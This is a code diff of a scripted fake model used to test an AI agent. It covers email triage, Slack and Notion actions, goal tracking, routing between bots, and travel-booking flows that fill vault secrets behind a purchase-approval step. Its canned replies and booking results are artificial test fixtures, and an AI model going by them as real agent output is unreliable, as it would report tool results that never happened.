-                     "| 3 | Bluehost | More server locations now available | 可退订 |\n\n"
-                     "### 结论\n\n- ✅ **无需回复**：大多数是自动通知\n- ⚠️ **需要处理**：John 的合作提案，建议周二前回复\n\n"
-                     "```\ndeploy:shadow-trader-combination-2.3h:nav failed at step verify_data_consistency_check_with_a_very_long_identifier\n```\n\n"
-                     "参考链接：https://example.com/a/very/long/path/that/keeps/going/and/going/without/any/spaces/at/all/for/testing")
-    if "inbox this week" in goal:
-        if n == 0:
-            return reply("", [tc("plan_task", {"objective": "Triage this week's inbox and prepare replies"})])
-        if n == 1:
-            return reply("", [tc("notion_search", {"query": "plan"})])
-        if n == 2:
-            return reply("", [tc("notion_get_page", {"page_id": "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"})])
-        return reply("I went through **42 emails** from the last 7 days. Three need you:\n\n"
-                     "| # | From | Subject | Suggested action |\n|---|---|---|---|\n"
-                     "| 1 | John Smith (Acme) | Contract terms — final version | Reply: confirm Tuesday 3pm call |\n"
-                     "| 2 | Maria Chen | Q4 launch budget | Reply: approve, ask for the timeline |\n"
-                     "| 3 | Stripe | Payout on hold — action needed | Update bank details in the dashboard |\n\n"
-                     "### Drafts ready\n- ✉️ **Reply to John** — saved as a Gmail draft, sending needs your approval\n"
-                     "- ✉️ **Reply to Maria** — saved as a draft, references the Q4 plan in Notion (launch in October)\n\n"
-                     "### Nothing to do\n- 31 newsletters and notifications — 12 of them can be unsubscribed in one click\n\n"
-                     "Want me to send both replies now? I'll ask Sentinel for approval first.")
-    if "Q4 plan summary" in goal:
-        if n == 0:
-            return reply("", [tc("plan_task", {"objective": "Share the Q4 plan with the team on Slack"})])
-        if n == 1:
-            return reply("", [tc("notion_get_page", {"page_id": "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"})])
-        if n == 2:
-            return reply("", [tc("slack_send_message", {"channel": "#general", "text": "📌 *Q4 plan* — we ship OMuse 0.2 in October. Goals: 1) launch on Olares Market 2) 100 beta users 3) Notion & Slack integrations. Full plan in Notion."})])
-        return reply("Posted to #general ✓")
-    if "Get John to confirm" in goal and "GOAL" not in goal and "goal_update" in json.dumps(b.get("tools") or []):
-        if n == 0:
-            return reply("", [tc("goal_update", {"status": "active", "progress": "John opened the email but hasn't replied yet. Drafted a polite follow-up for tomorrow 9:00 (sending needs your approval)."})])
-        return reply("Progress recorded.")
-    if "TRIGGERTEST" in goal:
-        if "UNTRUSTED" not in goal or "<untrusted_content" not in goal:
-            return reply("TRIGGER_NO_EVENTS")
-        return reply("Trigger handled: " + goal.split("<untrusted_content", 1)[1][:300])
-    if "GOALACHIEVE" in goal:
-        if n == 0:
-            return reply("", [tc("goal_update", {"status": "achieved", "progress": "John confirmed the contract."})])
-        return reply("Goal achieved: " + last_tool[:100])
-    if "GOALSILENT" in goal:
-        return reply("Checked, nothing new yet.")
-    if "GOALCREATE" in goal:
-        if n == 0:
-            return reply("", [tc("goal_create", {"title": "Contract GOALACHIEVE", "objective": "Get John to confirm the contract",
-                                                 "success_criteria": "John replies yes", "check_kind": "interval", "check_spec": "60",
-                                                 "deadline": "2030-01-01"})])
-        return reply("Created: " + last_tool[:200])
-    if "SLACKNOTION" in goal:
-        if n == 0:
-            return reply("", [tc("notion_get_page", {"page_id": "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"})])
-        if n == 1:
-            return reply("", [tc("slack_send_message", {"channel": "#general", "text": "Q4 plan: Ship OMuse 0.2"})])
-        return reply("Posted: " + last_tool[:200])
-    if "MCPNOTES" in goal:
-        names = [t["function"]["name"] for t in b.get("tools") or []]
-        if n == 0:
-            if "mcp_notes__notes_search" not in names:
-                return reply("NO_MCP_TOOL " + ",".join(x for x in names if x.startswith("mcp_")))
-            return reply("", [tc("mcp_notes__notes_search", {"query": "q3"})])
-        if n == 1:
-            return reply("", [tc("mcp_notes__notes_create", {"title": "Summary", "text": "Q3: " + last_tool[-80:]})])
-        return reply("MCP done: " + last_tool[:200])
     if "XMLTOOL" in goal:
         if n == 0:
             return reply('<tool_call>{"name": "files_write", "arguments": {"path": "notes/a.md", "content": "hello"}}</tool_call>')
         return reply("<think>hidden</think>Wrote file: " + last_tool)
-    for _kw, _kind in (("FLIGHTBOOK", "flight"), ("HOTELBOOK", "hotel"), ("MICHELINBOOK", "michelin")):
-        if _kw in goal:   # travel_*_e2e.py: data connector first, the browser only for the booking page
-            return travel_book(_kind, goal, msgs, tnames)
     return reply("<think>reasoning here</think>你好！这是一个普通回答。")
 
 
@@ -1022,273 +652,6 @@ def fake_locate(sys, content):
     return json.dumps({"on_item": d < 25})
 
 
-# ---------------------------------------------------------------- travel booking scenarios (travel_*_e2e.py)
-# FLIGHTBOOK / HOTELBOOK / MICHELINBOOK: load_skill → the travel connector's MCP tools → present_choices → vault_list (when a
-# card or passport is needed) → purchase_confirm → browser_navigate(booking_url) → browser_type / browser_fill_secret →
-# click the confirm button (approval or covered by the purchase) → final answer quoting the booking reference.
-TRAVELLER = {"name": "Lucas Lu", "email": "lucas@example.com", "phone": "+65 8000 0000"}
-
-
-def _travel_calls(msgs):
-    """[(name, args, result text)] of every tool call so far, in order."""
-    res = {m.get("tool_call_id"): str(m.get("content") or "") for m in msgs if m.get("role") == "tool"}
-    out = []
-    for m in msgs:
-        if m.get("role") != "assistant":
-            continue
-        for c in m.get("tool_calls") or []:
-            fn = c.get("function") or {}
-            try:
-                args = json.loads(fn.get("arguments") or "{}") if isinstance(fn.get("arguments"), str) else (fn.get("arguments") or {})
-            except ValueError:
-                args = {}
-            out.append((fn.get("name", ""), args, res.get(c.get("id"), "")))
-    return out
-
-
-def _json_find(text, key):
-    """The first JSON object holding `key` anywhere in a tool result (the data sits as a JSON string inside the envelope)."""
-    def walk(o):
-        if isinstance(o, dict):
-            if key in o:
-                return o
-            vals = o.values()
-        elif isinstance(o, list):
-            vals = o
-        elif isinstance(o, str) and o.lstrip()[:1] in ("{", "["):
-            try:
-                return walk(json.loads(o))
-            except ValueError:
-                return None
-        else:
-            return None
-        for v in vals:
-            r = walk(v)
-            if r is not None:
-                return r
-        return None
-    dec = json.JSONDecoder()
-    for i, ch in enumerate(text):
-        if ch != "{":
-            continue
-        try:
-            obj, _ = dec.raw_decode(text, i)
-        except ValueError:
-            continue
-        r = walk(obj)
-        if r is not None:
-            return r
-    return None
-
-
-def _snap_ref(text, label, role=r"\w+"):
-    m = re.search(r"\[((?:f\d+)?e\d+)\]\s+" + role + r"\s+\\*\"" + re.escape(label), text)
-    return m.group(1) if m else None
-
-
-def _vault_id(text, kind):
-    for line in text.replace("\\n", "\n").splitlines():
-        m = re.search(r"(vlt_\w+)", line)
-        if m and f"· {kind} ·" in line:
-            return m.group(1)
-    return None
-
-
-def _car_url(text):
-    """The booking_url of a cars_search result (Kayak's or Rentalcars.com's page for the rental)."""
-    for u in re.findall(r'booking_url\\?"?: ?\\?"(https?://[^"\\]+)', text):
-        if "kayak" in u or "rentalcars" in u:
-            return u
-    return "?"
-
-
-_TRAVEL_SEEN = {}   # (kind, goal) -> the first search's parsed result, for turns after compression trimmed it
-
-
-def travel_book(kind, goal, msgs, tnames):
-    import datetime as _dt
-    calls = _travel_calls(msgs)
-    names = [c[0] for c in calls]
-
-    def tool(suffix):
-        return next((t for t in tnames if t.endswith("__" + suffix)), None)
-
-    def has(suffix):
-        return any(n == suffix or n.endswith("__" + suffix) for n in names)
-
-    def result(suffix):
-        return next((r for n, _, r in reversed(calls) if n == suffix or n.endswith("__" + suffix)), "")
-
-    dates = re.findall(r"\d{4}-\d{2}-\d{2}", goal) or [str(_dt.date.today() + _dt.timedelta(days=21))]
-    # once the booking button was pressed, answer from the confirmation and the approved purchase summary — the first
-    # search result may have been trimmed by context compression by then (a long skill sheet plus page snapshots)
-    if has("browser_click"):
-        after = "\n".join(r for n, _, r in calls if n in ("browser_click", "browser_snapshot"))
-        m = re.search(r"TRV-[A-Z0-9]{7}", after)
-        pc = next((a for n, a, _ in calls if n == "purchase_confirm"), None)
-        if m:
-            what = (pc or {}).get("items", [{}])[0].get("name", kind)
-            total = f" total {(pc or {}).get('currency', '')} {(pc or {}).get('total', '')}" if pc else ""
-            return reply(f"Booked. Booking reference: {m.group(0)}. {what}{total}. Confirmation goes to {TRAVELLER['email']}.")
-        if not has("browser_snapshot"):
-            return reply("", [tc("browser_snapshot", {})])
-        return reply("TRAVEL FAIL: no booking reference after the click: " + after[-800:])
-    skill = {"flight": "flight-booking", "hotel": "hotel-booking", "michelin": "michelin-dining"}[kind]
-    if not has("load_skill"):
-        return reply("", [tc("load_skill", {"name": skill})])
-    data_tools = {"flight": ("flights_search", "flight_offer"), "hotel": ("hotels_search", "hotel_rooms"),
-                  "michelin": ("michelin_search", "restaurant_availability")}[kind]
-    if not all(tool(x) for x in data_tools):
-        return reply("TRAVEL FAIL: no travel connector tools; mcp tools offered: " + ",".join(t for t in tnames if t.startswith("mcp_")))
-
-    # ---- 1. data: search, details, the pick
-    if kind == "flight":
-        if not has("flights_search"):
-            return reply("", [tc(tool("flights_search"), {"origin": "Singapore", "destination": "Tokyo", "date": dates[0],
-                                                          "adults": 1, "nonstop_only": True})])
-        data = _json_find(result("flights_search"), "offers") or {}
-        # remember the offers: later in the task context compression may have trimmed the first search result
-        if data.get("offers"):
-            _TRAVEL_SEEN[(kind, goal)] = data
-        data = data if data.get("offers") else _TRAVEL_SEEN.get((kind, goal), {})
-        options = sorted([o for o in data.get("offers") or [] if o.get("stops") == 0], key=lambda o: o["fare_amount"])
-        if not options:
-            return reply("TRAVEL FAIL: no direct offers in " + result("flights_search")[:600])
-        pick = options[0]
-        if not has("flight_offer"):
-            return reply("", [tc(tool("flight_offer"), {"offer_id": pick["offer_id"]})])
-        cards = [{"label": o["title"], "details": [o["schedule"], o["duration"], o["stops_text"], o["fare"]],
-                  "source_url": o["booking_url"], "note": ("Cheapest direct. " if i == 0 else "") + o["baggage"]}
-                 for i, o in enumerate(options[:3])]
-        amount, currency, url = float(pick["fare_amount"]), "SGD", pick["booking_url"]
-        item = f"{pick['title']} {pick['schedule']} on {dates[0]}, 1 adult"
-        delivery, note = f"E-ticket to {TRAVELLER['email']}", f"{pick['baggage']}. {pick['refund_rules']}"
-        need_card, need_passport, button = True, True, "Pay now"
-        summary = f"{pick['title']}, {pick['schedule']} ({pick['duration']}, {pick['stops_text']}), total {pick['fare']}"
-    elif kind == "hotel":
-        ci, co = (dates + [str(_dt.date.fromisoformat(dates[0]) + _dt.timedelta(days=3))])[:2]
-        if not has("hotels_search"):
-            return reply("", [tc(tool("hotels_search"), {"city": "Tokyo", "check_in": ci, "check_out": co, "guests": 2, "min_stars": 4})])
-        hotels = (_json_find(result("hotels_search"), "hotels") or {}).get("hotels") or []
-        if not hotels:
-            return reply("TRAVEL FAIL: no hotels in " + result("hotels_search")[:600])
-        h = hotels[0]
-        if not has("hotel_rooms"):
-            return reply("", [tc(tool("hotel_rooms"), {"hotel_id": h["hotel_id"], "check_in": ci, "check_out": co, "guests": 2})])
-        rooms = [r for r in (_json_find(result("hotel_rooms"), "rooms") or {}).get("rooms") or []
-                 if str(r.get("cancellation", "")).startswith("Free")]
-        if not rooms:
-            return reply("TRAVEL FAIL: no free-cancellation room in " + result("hotel_rooms")[:600])
-        rooms.sort(key=lambda r: r["total_amount"])
-        pick = rooms[0]
-        cards = [{"label": r["room_type"], "details": [h["name"], r["price_per_night"], r["total"], r["cancellation"]],
-                  "source_url": r["booking_url"], "note": ("Cheapest with free cancellation. " if i == 0 else "") + r["payment"]}
-                 for i, r in enumerate(rooms[:2])]
-        amount, currency, url = float(pick["total_amount"]), "SGD", pick["booking_url"]
-        item = f"{h['name']} - {pick['room_type']}, {ci} to {co} ({pick['nights']} nights)"
-        delivery, note = f"Hotel stay, {pick['payment']}", pick["cancellation"]
-        need_card, need_passport, button = False, False, "Confirm booking"
-        summary = f"{h['name']} ({h['area']}), {pick['room_type']}, {ci} to {co}, {pick['total']}; {pick['cancellation']}"
-    else:
-        if not has("michelin_search"):
-            return reply("", [tc(tool("michelin_search"), {"city": "Tokyo", "distinction": "2 stars"})])
-        rests = (_json_find(result("michelin_search"), "restaurants") or {}).get("restaurants") or []
-        if not rests:
-            return reply("TRAVEL FAIL: no restaurants in " + result("michelin_search")[:600])
-        r0 = rests[0]
-        if not has("restaurant_availability"):
-            return reply("", [tc(tool("restaurant_availability"), {"restaurant_id": r0["restaurant_id"], "date": dates[0], "party_size": 2})])
-        av = _json_find(result("restaurant_availability"), "slots") or {}
-        slots = av.get("slots") or []
-        if not slots:
-            return reply("TRAVEL FAIL: no slots in " + result("restaurant_availability")[:600])
-        slots.sort(key=lambda s: abs(int(s["time"][:2]) * 60 + int(s["time"][3:]) - 19 * 60))
-        pick = slots[0]
-        cards = [{"label": r0["name"], "details": [r0["distinction"], r0["cuisine"], s["time"], r0["deposit_policy"]],
-                  "source_url": s["booking_url"], "note": "Closest to 19:00." if i == 0 else "Alternative time."}
-                 for i, s in enumerate(slots[:2])]
-        dep = str(av.get("deposit_due_now") or "")
-        currency = dep.split()[0] if dep and dep != "none" else "JPY"
-        amount = float(re.sub(r"[^\d.]", "", dep.split()[-1])) if dep and dep != "none" else 0.0
-        url = pick["booking_url"]
-        item = f"{r0['name']} {dates[0]} {pick['time']}, 2 guests - deposit"
-        delivery, note = "Table reservation", r0["deposit_policy"]
-        need_card, need_passport, button = amount > 0, False, "Confirm booking"
-        summary = f"{r0['name']} ({r0['distinction']}, {r0['cuisine']}), {dates[0]} at {pick['time']} for 2, deposit {dep}"
-
-    # ---- 2. show the options (the request already says which one to book, so go on)
-    if not has("present_choices"):
-        return reply("", [tc("present_choices", {"question": "Which one should I book?", "kind": "comparison", "options": cards})])
-    if (need_card or need_passport) and not has("vault_list"):
-        return reply("", [tc("vault_list", {})])
-    vl = result("vault_list")
-    card_id, passport_id = _vault_id(vl, "card"), _vault_id(vl, "id_document")
-    # ---- 3. the booking page: one navigate, the purchase confirmed on it, fill, one click
-    if not has("browser_navigate"):
-        return reply("", [tc("browser_navigate", {"url": url})])
-    page = result("browser_navigate")
-    if amount > 0 and not has("purchase_confirm"):
-        # the site as a model sees it: the host of the link it was given — a stand-in's host, never the shop's
-        # (Sentinel takes the real site from the open page)
-        args = {"site": url.split("/")[2].split(":")[0], "items": [{"name": item, "qty": 1, "price": amount}],
-                "shipping": 0, "total": amount, "currency": currency, "delivery": delivery, "note": note}
-        if need_card and card_id:
-            args["card_item_id"] = card_id
-        return reply("", [tc("purchase_confirm", args)])
-    if not has("browser_type"):
-        fields = [("Full name", TRAVELLER["name"]), ("Email", TRAVELLER["email"]), ("Phone", TRAVELLER["phone"])]
-        typed = [tc("browser_type", {"ref": _snap_ref(page, lbl), "text": v}) for lbl, v in fields if _snap_ref(page, lbl)]
-        if not typed:
-            return reply("TRAVEL FAIL: no form fields on the booking page: " + page[:800])
-        return reply("", typed)
-    fills = [a for n, a, _ in calls if n == "browser_fill_secret"]
-    if need_passport and passport_id and not any(a.get("item_id") == passport_id for a in fills):
-        return reply("", [tc("browser_fill_secret", {"ref": _snap_ref(page, "Passport number") or "e1", "item_id": passport_id,
-                                                     "field": "number"})])
-    if need_card and card_id and not any(a.get("item_id") == card_id for a in fills):
-        boxes = [("Card number", "number"), ("Expiry", "expiry"), ("CVC", "cvc"), ("Name on card", "holder")]
-        return reply("", [tc("browser_fill_secret", {"ref": _snap_ref(page, lbl), "item_id": card_id, "field": f})
-                          for lbl, f in boxes if _snap_ref(page, lbl)])
-    if not has("browser_click"):
-        # the button from the newest page text (every browser call returns one; compression may have trimmed the
-        # navigate result's tail, where the button is); none found → a fresh snapshot first
-        pages = [r for nm, _, r in reversed(calls) if nm.startswith("browser_")]
-        ref = next((x for x in (_snap_ref(pg, button, "button") for pg in pages) if x), None)
-        if not ref:
-            if not has("browser_snapshot"):
-                return reply("", [tc("browser_snapshot", {})])
-            return reply("TRAVEL FAIL: no " + button + " button on the booking page")
-        return reply("", [tc("browser_click", {"ref": ref})])
-    after = "\n".join(r for n, _, r in calls if n in ("browser_click", "browser_snapshot"))
-    m = re.search(r"TRV-[A-Z0-9]{7}", after)
-    if not m and not has("browser_snapshot"):
-        return reply("", [tc("browser_snapshot", {})])
-    if not m:
-        return reply("TRAVEL FAIL: no booking reference after the click: " + after[-800:])
-    return reply(f"Booked. Booking reference: {m.group(0)}. {summary}. Confirmation goes to {TRAVELLER['email']}.")
-
-
-# ---------------------------------------------------------------- the travel-skill suites (tests/skills_common.py)
-PAGES = "http://shop.test:8099"
-
-
-def _subjects(tool_contents):
-    out = []
-    for t in tool_contents:
-        out += re.findall(r'"subject": "([^"]+)"', str(t))
-    return list(dict.fromkeys(out))
-
-
-def _msg_id(text):
-    m = re.search(r'"id": "([^"]+)"', str(text))
-    return m.group(1) if m else "1"
-
-
-def _upload_path(sys, goal, ext):
-    m = re.search(r"(uploads/[^\s(\"']+\." + ext + ")", sys + "\n" + goal)
-    return m.group(1) if m else f"uploads/x.{ext}"
-
-
 # marketing_shots.py: natural prompts (no test markers in the pictures) with presentable answers
 STREAM_STORY = ("Once upon a time, in a small town by the sea, there lived a lighthouse keeper named Mara. " * 6 +
                 "Every evening she climbed the one hundred and twelve steps, lit the lamp, and watched the fishing boats come home. "
@@ -1300,7 +663,7 @@ SHOW_CITY = "We're moving to Shanghai for work with two kids. Where do expat fam
 
 def route_reply(user):
     """The router's JSON (bots_e2e.py): BOTHAND / BOTAPPR / BOTWAIT go to Travel with the kid's marker as the
-    question, BOTFOLLOW to the conversation the history names, BOTROUTEFAIL gets no JSON (the executor decides with
+    question, BOTROUTEFAIL gets no JSON (the executor decides with
     ask_bot), BOTROUTEBAD names a bot that does not exist; everything else stays in Main."""
     req = user.split("The user's new request:\n", 1)[-1]
     date = (re.search(r"DATE=(20\d\d-\d\d-\d\d)", req) or re.search(r"(20\d\d-\d\d-\d\d)", "x 2026-12-20")).group(1)
@@ -1318,10 +681,6 @@ def route_reply(user):
             if marker == "BOTHAND" and "BOTSTREAM" in req:   # bots_ui.py: a question (the model answers, streamed) — a dated search would be code's
                 kid = "BOTKID1 which airlines fly Singapore to Tokyo direct?"
             return reply(json.dumps({"bot": "travel", "question": kid + slow}))
-    if "BOTFOLLOW" in req:
-        m = re.search(r"\[answered by the travel bot in conversation (conv_\w+)\]", user)
-        return reply(json.dumps({"bot": "travel", "question": "BOTKID2 and the return flight a week later",
-                                 "conversation_id": m.group(1) if m else ""}))
     if "BOTCONVBAD" in req:   # a conversation that is not that bot's: the code starts a new one
         return reply(json.dumps({"bot": "travel", "question": f"BOTKID1 checked conv DATE={date}", "conversation_id": "conv_nope"}))
     return reply('```json\n{"bot": "main"}\n```')
@@ -1338,13 +697,6 @@ def bots_flow(goal, sys, msgs, tools_done, n, allu):
                             ("BOTAPPR", "BOTKIDAPPR book the SQ638 for SGD 620"), ("BOTWAIT", "BOTKIDWAIT log in to the airline site")):
             if marker in goal:
                 return reply("", [tc("ask_bot", {"bot": "travel", "question": kid})])
-        if "BOTFOLLOW" in goal:
-            hist = "\n".join(str(m["content"]) for m in msgs if m["role"] in ("user", "assistant"))
-            m = re.search(r"\[answered by the travel bot in conversation (conv_\w+)\]", hist)
-            if not m:
-                return reply("NO HANDOFF IN HISTORY")
-            return reply("", [tc("ask_bot", {"bot": "travel", "conversation_id": m.group(1),
-                                             "question": "BOTKID2 and the return flight a week later"})])
         if "BOTSKILL" in goal:   # the main bot has no travel skill: load_skill is refused and points to ask_bot
             return reply("", [tc("load_skill", {"name": "flight-booking"})])
         if "BOTTOOL" in goal:    # nor the travel searches: the tool is not offered, and a call is refused
@@ -1368,12 +720,9 @@ def bots_flow(goal, sys, msgs, tools_done, n, allu):
         if n == 1:   # the search is ONE workflow call; code runs it (the reply to its result: `workflow_reply`)
             return reply("", [tc("travel_search", {"kind": "flight", "origin": "SIN", "destination": "TYO", "date": date})])
         return reply(f"TRAVELBOT ANSWER {date}: Singapore Airlines SQ638 SGD 620 direct; Cathay Pacific via HKG SGD 510.")
-    if travel and "BOTKID2" in goal:
-        earlier = "TRAVELBOT ANSWER" in allu or any("TRAVELBOT ANSWER" in str(m["content"]) for m in msgs if m["role"] == "assistant")
-        return reply("TRAVELBOT FOLLOW-UP: " + ("the outbound was SQ638, so the return is SQ637 a week later." if earlier else "NO CONTEXT"))
     if travel and "BOTKIDAPPR" in goal:
         if n == 0:
-            return reply("", [tc("purchase_confirm", {"site": "shop.test", "items": [{"name": "Flight SQ638 SIN-NRT", "price": 620}],
+            return reply("", [tc("purchase_confirm", {"site": "www.singaporeair.com", "items": [{"name": "Flight SQ638 SIN-NRT", "price": 620}],
                                                       "total": 620, "currency": "SGD"})])
         return reply("TRAVELBOT BOOKED: the purchase of SQ638 was approved.")
     if travel and "BOTKIDWAIT" in goal:
@@ -1384,52 +733,9 @@ def bots_flow(goal, sys, msgs, tools_done, n, allu):
 
 
 # ---------------------------------------------------------------- workflow tools (agent/booking.rs, docs/json-tools.md)
-# The fake stands in for the model's understanding: a travel or shopping marker becomes ONE workflow call with the request's
+# The fake stands in for the model's understanding: a marker becomes ONE workflow call with the request's
 # details as JSON arguments (the skill loaded first, as a model does); code runs every step; the result's JSON comes back
 # as `<tool>_result` and the reply is written from it (`workflow_reply`).
-
-
-def workflow_args(goal, msgs):
-    """(tool, skill, args) for the travel / shopping markers, or None."""
-    goal = goal if isinstance(goal, str) else json.dumps(goal)   # a vision request's content is a list of parts
-    dates = re.findall(r"20\d\d-\d\d-\d\d", goal)
-    m = re.search(r"DATE=(20\d\d-\d\d-\d\d)", goal)
-    d = m.group(1) if m else (dates[0] if dates else "")
-    flight = {"kind": "flight", "origin": "Singapore", "destination": "Tokyo", "date": d}
-    if any(k in goal for k in ("KIWIFLIGHTS", "ZEROCAP", "PREFNONE")):
-        return "travel_search", "flight-booking", flight
-    if "BIZFLIGHTS" in goal:
-        return "travel_search", "flight-booking", {**flight, "origin": "Tokyo", "destination": "SIN", "cabin": "business", "nonstop": True}
-    if "FLEXFLIGHTS" in goal:
-        return "travel_search", "flight-booking", {**flight, "date": dates[0], "date_to": dates[1]}
-    if "BOOKIT" in goal:
-        return "travel_book", "flight-booking", {**flight, "use_connector": True}
-    if "TRAVELSEARCH" in goal:
-        return "travel_search", "flight-booking", {**flight, "next": ["hotel"]}
-    if "BRAVETRAVEL" in goal:
-        return "travel_search", "flight-booking", {**flight, "next": ["hotel", "car"]}
-    if "TRAVELHOTEL" in goal or "BRAVEHOTEL" in goal:
-        out = (_dtm.date.fromisoformat(d) + _dtm.timedelta(days=3)).isoformat()
-        args = {"kind": "hotel", "city": "Tokyo", "area": "Ginza", "min_stars": 4, "date": d, "check_out": out}
-        if "BRAVEHOTEL" in goal:
-            args["next"] = ["car"]
-        return "travel_search", "hotel-booking", args
-    return None
-
-
-def workflow_call(goal, msgs):
-    """The marker's workflow call (after loading the skill); None when the goal is no such scenario."""
-    w = workflow_args(goal, msgs)
-    if w is None:
-        return None
-    tool, skill, args = w
-    called = [c["function"]["name"] for m in msgs if m.get("role") == "assistant" for c in (m.get("tool_calls") or [])]
-    if "load_skill" not in called:
-        return reply("", [tc("load_skill", {"name": skill})])
-    if tool not in called:
-        return reply("", [tc(tool, args)])
-    last = next((m for m in reversed(msgs) if m.get("role") == "tool"), {})
-    return reply("WORKFLOW " + str(last.get("content") or "")[:400])
 
 
 def workflow_reply(content, head=""):
@@ -1492,155 +798,6 @@ def travel_skill(goal, sys, msgs, tools_done, n, last_tool, tnames):
                      "**Before you sign**: one month's deposit plus 1–3 months' rent in advance; agents (Lianjia/Beike 贝壳, Ziroom 自如) charge up to a month. "
                      "School places fill early — Shanghai American School, Concordia and Dulwich publish fees of roughly ¥250,000–390,000 a year. "
                      "Want me to remember which area you choose for next time?")
-    if "TRIPTODAY" in goal:   # trip-today: mail + calendar in one turn, then the timeline with the gap
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "trip-today"})])
-        if n == 1:
-            calls = [tc_("gmail_search", {"query": "(flight OR e-ticket OR itinerary) newer_than:60d", "max_results": 30}),
-                     tc_("gmail_search", {"query": "(hotel OR booking OR reservation) newer_than:60d", "max_results": 30}),
-                     tc_("gmail_search", {"query": "(restaurant OR table) newer_than:60d", "max_results": 30})]
-            if "calendar_list_events" in tnames:
-                calls.append(tc_("calendar_list_events", {"time_min": "2026-11-18", "time_max": "2026-11-26"}))
-            return reply("", calls)
-        subs = _subjects(m["content"] for m in tools_done)
-        return reply("TRIP TIMELINE (from your mail and calendar):\n" + "\n".join(f"- {x}" for x in subs) +
-                     "\n\nGAP: no hotel for the night of 2026-11-23 (Hotel Ginza Grand checks out 23 Nov, SQ 637 flies 24 Nov).\n"
-                     "Insurance: no travel insurance email was found — delays and lost luggage are common claims; are you covered?")
-    if "ENTRYREQ" in goal:   # entry-requirements: official pages read, reminder set
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "entry-requirements"})])
-        if n == 1:
-            return reply("", [tc_("profile_get", {"fields": ["nationality"]})])
-        if n == 2:
-            return reply("", [tc_("browser_read", {"urls": [PAGES + "/tdac.html", PAGES + "/sgac_classic.html"]})])
-        if n == 3:
-            return reply("", [tc_("schedule_create", {"name": "File the Thailand TDAC", "goal": "Remind me to file the TDAC at tdac.immigration.go.th (within 3 days before arrival)",
-                                                       "kind": "cron", "spec": "0 9 * * *"})])
-        return reply("| Destination | Requirement | When | Status | Official link | Date checked |\n|---|---|---|---|---|---|\n"
-                     "| Thailand | TDAC digital arrival card | within 3 days before arrival | reminder set | tdac.immigration.go.th | 2026-10-25 |\n"
-                     "| Singapore | SG Arrival Card + health declaration | within 3 days before arrival | I can fill it (sg-arrival-card) | eservices.ica.gov.sg | 2026-10-25 |\n"
-                     "Passport: at least 6 months validity for Thailand (page read today).")
-    if "BRAVECAR" in goal:   # the car after the flight and the hotel (no machine for cars): cars_search through the Brave web search
-        d1 = _dtm.date.fromisoformat(re.search(r"DATE=(\d{4}-\d\d-\d\d)", goal).group(1))
-        d3 = d1 + _dtm.timedelta(days=3)
-        if n == 0:
-            return reply("", [tc_("cars_search", {"pickup": "NRT", "pickup_date": d1.isoformat(), "dropoff_date": d3.isoformat(), "car_class": "small"})])
-        allt = "\n".join(str(m["content"]) for m in tools_done)
-        srcs = re.findall(r"web search \(([^)]+)\)", allt)
-        return reply(f"SEARCHED VIA {sorted(set(srcs))}: compact car at Narita (Brave result 1), live prices at {_car_url(allt)}.")
-    if "TWOSEARCH" in goal:   # a model that searches several times: only the first travel search of the request runs, and
-        # the flight and hotel searches are the booking machine's in the Travel bot (`travel_search`), never the model's
-        date = re.search(r"DATE=(20\d\d-\d\d-\d\d)", goal).group(1)
-        out = (_dtm.date.fromisoformat(date) + _dtm.timedelta(days=2)).isoformat()
-        later = (_dtm.date.fromisoformat(date) + _dtm.timedelta(days=1)).isoformat()
-        if n == 0:
-            return reply("", [tc_("cars_search", {"pickup": "NRT", "pickup_date": date, "dropoff_date": out}),
-                              tc_("cars_search", {"pickup": "HND", "pickup_date": date, "dropoff_date": out}),
-                              tc_("flights_search", {"origin": "SIN", "destination": "NRT", "date": date, "currency": "SGD"}),
-                              tc_("hotels_search", {"city": "Tokyo", "check_in": date, "check_out": out})])
-        if n == 4:   # next turn: a flight search of its own (refused: the machine's), then a car search (skipped: the turn's second)
-            return reply("", [tc_("flights_search", {"origin": "SIN", "destination": "NRT", "date": later, "currency": "SGD"}),
-                              tc_("cars_search", {"pickup": "NRT", "pickup_date": later, "dropoff_date": out})])
-        if n == 6:   # and one more car search alone: the request already ran its one
-            return reply("", [tc_("cars_search", {"pickup": "HND", "pickup_date": later, "dropoff_date": out})])
-        return reply("TWOSEARCH done: one travel search answered this request; shall I search the hotel and the car next?")
-    if "CARSEARCH" in goal:   # a car question: cars_search alone, and the answer gives the rental page's link
-        d1 = re.search(r"DATE=(20\d\d-\d\d-\d\d)", goal).group(1)
-        d3 = re.search(r"TO=(20\d\d-\d\d-\d\d)", goal).group(1)
-        if n == 0:
-            return reply("", [tc_("cars_search", {"pickup": "NRT", "pickup_date": d1, "dropoff_date": d3, "car_class": "compact"})])
-        allt = "\n".join(str(m["content"]) for m in tools_done)
-        return reply(f"CARS at Narita {d1} to {d3}: compact cars from the companies in the search results (\"from\" prices); "
-                     f"the live prices for your dates are at {_car_url(allt)}.")
-    wf = workflow_call(goal, msgs)
-    if wf is not None:
-        return wf
-    if "EXPENSES" in goal:   # travel-expense-report: receipt photo (vision), statement CSV, mail receipts, files
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "travel-expense-report"})])
-        if n == 1:
-            return reply("", [tc_("file_look", {"path": _upload_path(sys, goal, "png"),
-                                                "question": "Return a JSON object {merchant, address, date, time, currency, total, subtotal, tax, service_charge, tip, payment_method, card_last4, items, receipt_no, language, notes} exactly as printed."})])
-        if n == 2:
-            return reply("", [tc_("data_query", {"path": _upload_path(sys, goal, "csv")})])
-        if n == 3:
-            return reply("", [tc_("gmail_find_receipts", {"senders": ["agoda.com"], "days": 60})])
-        if n == 4:
-            return reply("", [tc_("calculate", {"expression": "18000 + 78000"})])
-        if n == 5:
-            return reply("", [tc_("make_xlsx", {"output": "expenses/tokyo-expenses.xlsx", "sheets": [
-                {"name": "Lines", "columns": ["date", "merchant", "category", "amount", "currency", "evidence"],
-                 "rows": [["2026-11-20", "Sushi Hoshizora", "meals", 18000, "JPY", "receipt R-7781 (photo) = statement row"],
-                          ["2026-11-21", "Agoda — Hotel Ginza Grand", "lodging", 78000, "JPY", "Agoda receipt email = statement row"]]},
-                {"name": "Summary", "columns": ["category", "JPY"], "rows": [["meals", 18000], ["lodging", 78000], ["total", 96000]]}]})])
-        if n == 6:
